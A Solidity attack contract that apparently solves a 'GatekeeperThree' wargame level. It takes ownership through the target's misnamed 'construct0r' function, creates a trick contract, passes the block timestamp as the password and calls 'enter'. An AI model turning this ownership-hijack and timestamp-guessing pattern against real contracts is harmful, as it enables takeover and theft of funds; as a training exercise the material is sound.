pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract AttackContractWithTime {
    IGatekeeperThree public target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    function changeOwner() public {
        target.construct0r();
    }

    function createAndInitiateTrick() public {
        target.createTrick();
    }

    function getBlockTimestamp() public view returns (uint256) {
        return block.timestamp;
    }

    function setAllowance() public {
        uint256 timestamp = getBlockTimestamp();
        (bool success, ) = address(target).call(
            abi.encodeWithSignature("getAllowance(uint256)", timestamp) // Use the same timestamp
        );
        require(success, "getAllowance call failed");
    }

    function enter() public {
        (bool success, ) = address(target).call(
            abi.encodeWithSignature("enter()") // No arguments, but relies on allowEntrance being true
        );
        require(success, "Enter failed");
    }
}
